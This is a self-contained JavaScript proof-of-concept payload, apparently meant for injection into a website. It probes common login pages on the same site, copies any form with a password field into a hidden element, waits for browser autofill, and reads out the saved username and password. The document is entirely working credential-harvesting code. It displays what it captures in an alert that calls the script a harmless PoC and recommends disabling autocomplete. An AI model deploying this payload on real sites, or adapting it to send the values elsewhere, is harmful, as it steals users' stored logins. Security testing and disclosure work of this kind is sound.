function autocomplete() {
    var extensions = ["", "/", ".php", ".aspx", ".asp", ".jsp"];
    var filenames = ["home", "login"];
    
    var targets = ["/", "wp-login.php"];
    
    for (var q = 0; q < filenames.length; q++)
        for (var w = 0; w < extensions.length; w++)
            targets.push("/" + filenames[q] + extensions[w]);
    
    loop(targets);
}

var t = 0;
var alerted = false;
function loop(T) {
    if (t >= T.length || t < 0) return false;
    
    var xhr = new XMLHttpRequest();
    xhr.page = T[t];
    xhr.open("GET", T[t], true);
    xhr.send();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            if (xhr.status == 200) {
                var html = xhr.responseText;
                var passwordTypeRegex = /(type=["']?password["']?)/;
                var pwdinput = html.toLowerCase().regexIndexOf(passwordTypeRegex);
                if (pwdinput > -1) {
                    var formStart = html.toLowerCase().lastIndexOf("<form", pwdinput);
                    var formEnd = html.toLowerCase().indexOf("</form>", pwdinput) + 7;
                    if (formStart > -1 && formEnd > formStart) {
                        var passwordForm = html.substring(formStart, formEnd);
                        if (!alerted) {
                            harvestCreds(passwordForm, xhr.page);
                            alerted = true;
                        }
                    } else {
                        xhr.close();
                    }
                }
            }
        }
    };
    
    if (++t < T.length) loop(T);
}

function harvestCreds(pForm, page) {
    var a = document.createElement("div");
    a.style.display = "none";
    a.innerHTML = pForm;
    document.body.appendChild(a);

    setTimeout(function() {
        var pInput = a.querySelector("input[type='password']");
        var p = pInput ? pInput.value : "-Could not recover-";
        
        var u = "-Could not recover-";
        var inputs = a.querySelectorAll("input");
        for (var i = 0; i < inputs.length; i++) {
            if (inputs[i] !== pInput && inputs[i].type === "text") {
                u = inputs[i].value;
                break;
            }
        }
        
        if (p === "" && u === "") {
            alert("No autocomplete credentials were found stored in your browser for this web form.");
        } else {
            alert("My script was able to steal the following credentials by tricking your browser into autocompleting the web form on the page `" + page + "`:\n\n"
                + "  \u2022 Username: " + (u !== "" ? u : "-Could not recover-") + "\n  \u2022 Password:  " + (p !== "" ? p : "-Could not recover-") + "\n\n"
                + "For assurance, this is a PoC and no credentials have been exposed to me. All code execution has taken place client-side in your browser only.\n\n"
                + "To prevent this type of attack, all web forms and their fields should have the autocomplete flag set to \"off\".");
        }
        
        a.parentNode.removeChild(a);
    }, 1000);
}

String.prototype.regexIndexOf = function(regex, startpos) {
    var indexOf = this.substring(startpos || 0).search(regex);
    return (indexOf >= 0) ? (indexOf + (startpos || 0)) : indexOf;
}

window.callback = autocomplete;

autocomplete();
